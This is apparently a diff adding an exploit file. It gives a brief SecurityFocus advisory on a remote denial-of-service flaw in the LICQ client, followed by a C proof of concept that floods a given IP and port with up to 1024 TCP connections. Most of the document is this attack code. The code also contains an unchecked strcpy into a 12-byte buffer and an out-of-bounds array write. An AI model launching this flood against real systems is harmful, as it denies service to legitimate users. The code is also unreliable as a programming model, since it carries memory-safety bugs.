@@ -1,0 +1,49 @@
+source: http://www.securityfocus.com/bid/28679/info
+
+LICQ is prone to a remote denial-of-service vulnerability because the application fails to handle exceptional conditions.
+
+A remote attacker can exploit this issue to crash the affected application, denying service to legitimate users. The attacker may also be able to execute code, but this has not been confirmed. 
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+// change to suit your needs
+#define MAX 1024
+
+int fds[MAX];
+
+int main(int argc, char *argv[])
+{
+   int port,a;
+   char host[12];
+   struct sockaddr_in victim;
+   struct in_addr inp;
+
+   if (argc!=3)
+   {
+       printf("usage: %s <ip> <port>\n",argv[0]);
+       exit(1);
+   }
+
+   port=atoi(argv[2]);
+   strcpy(host,argv[1]);
+   printf("ip=%s\n",host);
+
+   for (a=1;a<=MAX;a++)
+   {
+       fds[a]=socket(PF_INET,SOCK_STREAM,0);
+       victim.sin_family= AF_INET;
+       victim.sin_port=htons(port);
+       inet_aton(host,&victim.sin_addr);
+       connect(fds[a],&victim,sizeof(victim));
+   }
+
+   printf("done!");
+
+}
+
